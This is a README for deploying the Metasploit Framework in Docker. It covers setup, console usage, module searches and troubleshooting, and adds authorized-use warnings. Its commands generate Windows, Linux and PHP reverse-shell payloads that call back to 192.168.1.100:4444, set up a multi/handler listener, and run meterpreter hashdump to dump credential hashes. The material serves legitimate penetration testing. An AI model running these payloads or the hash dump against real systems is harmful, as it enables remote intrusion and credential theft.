# Metasploit Framework - Docker Deployment

Docker deployment of the Metasploit Framework for penetration testing and security research.

## Description

Containerized Metasploit Framework providing a complete penetration testing environment without installing dependencies on the host system.

## Prerequisites

- Docker
- Docker Compose

## Installation

```bash
# Pull and start Metasploit
docker-compose up -d
```

## Usage

### Start Metasploit Console

```bash
# Interactive msfconsole
docker-compose run --rm metasploit msfconsole
```

### Run Specific Tools

```bash
# msfvenom
docker-compose run --rm metasploit msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

# searchsploit
docker-compose run --rm metasploit searchsploit apache

# msfdb
docker-compose run --rm metasploit msfdb init
```

## Features

- Full Metasploit Framework
- Exploit modules
- Auxiliary modules
- Payload generation (msfvenom)
- Database support (PostgreSQL)
- Web interface (optional)

## Configuration

### Persistent Database

Mount PostgreSQL data:
```yaml
volumes:
  - postgres_data:/var/lib/postgresql/data
```

### Workspace Management

```bash
# Create workspace
msf6 > workspace -a project_name

# List workspaces
msf6 > workspace -l

# Switch workspace
msf6 > workspace project_name
```

## Common Commands

### Basic Usage

```bash
# Search exploits
msf6 > search type:exploit platform:linux

# Use module
msf6 > use exploit/multi/handler

# Show options
msf6 > show options

# Set options
msf6 > set LHOST 192.168.1.100
msf6 > set LPORT 4444

# Run exploit
msf6 > exploit
```

### Payload Generation

```bash
# Windows reverse shell
docker-compose run --rm metasploit \
  msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe

# Linux reverse shell
docker-compose run --rm metasploit \
  msfvenom -p linux/x64/shell_reverse_tcp \
  LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf

# PHP reverse shell
docker-compose run --rm metasploit \
  msfvenom -p php/reverse_php \
  LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php
```

## Modules

### Exploit Modules
```bash
# Show all exploits
msf6 > show exploits

# Search specific CVE
msf6 > search cve:2021 type:exploit
```

### Auxiliary Modules
```bash
# Port scanning
msf6 > use auxiliary/scanner/portscan/tcp

# SMB enumeration
msf6 > use auxiliary/scanner/smb/smb_version
```

### Post-Exploitation
```bash
# After getting a session
msf6 > sessions -i 1
meterpreter > sysinfo
meterpreter > getuid
meterpreter > hashdump
```

## Docker Compose Example

```yaml
services:
  metasploit:
    image: metasploitframework/metasploit-framework:latest
    volumes:
      - ./workspaces:/root/.msf4
      - ./loot:/root/loot
    network_mode: host  # For reverse shells
    stdin_open: true
    tty: true
```

## Security Notes

[WARNING] **CRITICAL**:
- **Authorized testing only** - Use only on systems you own or have written permission to test
- **Legal compliance** - Ensure compliance with local laws and regulations
- **Ethical use** - Follow responsible disclosure practices
- **Isolation** - Run in isolated network environment when possible
- **No malicious use** - For educational and authorized security testing only

## Troubleshooting

### Database Connection Issues

```bash
# Initialize database
docker-compose run --rm metasploit msfdb init

# Check database status
docker-compose run --rm metasploit msfdb status
```

### Module Not Found

```bash
# Update Metasploit
docker-compose pull

# Reload modules
msf6 > reload_all
```

## Use Cases

- Penetration testing
- Vulnerability assessment
- Security research
- Exploit development
- CTF competitions
- Security training

## Resources

- [Official Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 GitHub](https://github.com/rapid7/metasploit-framework)

## License

Personal project - Authorized testing only

---

**Disclaimer**: This tool is for authorized security testing only. Unauthorized access to computer systems is illegal.
